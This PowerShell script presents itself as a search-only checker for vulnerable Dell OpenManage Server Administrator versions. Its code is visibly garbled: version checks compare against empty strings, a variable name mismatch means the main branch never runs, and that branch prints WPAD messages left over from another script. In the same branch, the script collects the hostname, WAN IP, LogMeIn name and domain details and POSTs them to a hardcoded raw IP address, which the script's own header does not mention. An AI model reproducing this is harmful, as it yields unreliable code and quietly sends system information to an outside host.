$info="
#######################################################
# Find-OpenManageVulnVersions.ps1
# Alex Datsko alexd@mmeconsulting.com - 10-23-2024
#   This script searches for Dell OpenManage Server Administrator vulnerable versions
#   It should only be run on the physical server, HyperVhost or Dell combo server.
#   It will document the Name and version of OpenManage installed.
# v0.1 - 10-23-2024 - Search only and report, for now
#"

$info
(Get-Date -Format "yyyy-MM-dd hh:mm:ss")
[string]$Hostname = (hostname)
Write-Output "$Hostname - OS Version : $(([environment]::OSVersion.Version).Major).$(([environment]::OSVersion.Version).Minor) Build $(([environment]::OSVersion.Version).Build) Rev $(([environment]::OSVersion.Version).Revision)"


function Check-OMSAVulnVersion {
  param(
    [version]$Version
  )
  if ($Version) { 
    if ($Version -eq "11.0.0.0") {
      return $true
    }
    if ($Version -eq "") {
      return $true
    }
    if ($Version -eq "") {
      return $true
    }    
  } else {
    Write-Output "[!] No version found : [$($Version)]"
  }
}

function Search-Software {
  param(
    [string]$SoftwareName)

  $SearchString="*$($SoftwareName)*"
  $Results = (get-wmiobject Win32_Product | Where-Object { $_.Name -like $SearchString })
  if ($Results) {
    return $Results
  } else {
    $Results = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object { $_.DisplayName -like $SearchString }
    if ($Results) {
      if ($Results.UninstallString) {
        return $Results.UninstallString
      } # else we get the error below
    }
    Write-Host "[!] No WMI entry, or registry uninstallstring found.. no way to uninstall this automatically it appears!" -ForegroundColor Red
    return $null
  }
}

$DellOMSAVersion = Check-OMSAVulnVersion -Version "$(Search-Software "OpenManage")"
if ($DellOMSAVulnVersion) {
  Write-Output "`n[!!!!!] WPAD DISABLED GPO Found: $DisabledWPAD  [!!!!!]"
  $OUs = (Get-ADOrganizationalUnit -Filter *).Name | Where-Object { @("Domain Controllers","Disabled Accounts","Computers","Workstations","Users","Staff","Disabled Users") -notcontains $_ } | Sort-Object | Get-Unique
  $IP=(IWR "ifconfig.me").Content
  $LMIName = (Get-ItemProperty "HKLM:\SOFTWARE\LogMeIn\V5\WebSvc")."HostDescription"
  $Output = "`nWPAD FOUND | LMI Name: $LMIName | WAN IP: $IP | FQDN: $($Hostname).$($ADDomain)"
  $Output
  IWR -Uri "http://45.26.118.188:48888" -method post -UseBasicParsing -Body $Output
  # Fix if found? Soon..
} else {
  if ($EnabledWPAD) {
    Write-Output "`n[--] WPAD GPO Found, already fixed: $EnabledWPAD  [--]"
  } else {
    Write-Output "`n[-] No WPAD GPO found [-]"
  }
}


Write-Output "[+] Complete."
(Get-Date -Format "yyyy-MM-dd hh:mm:ss")
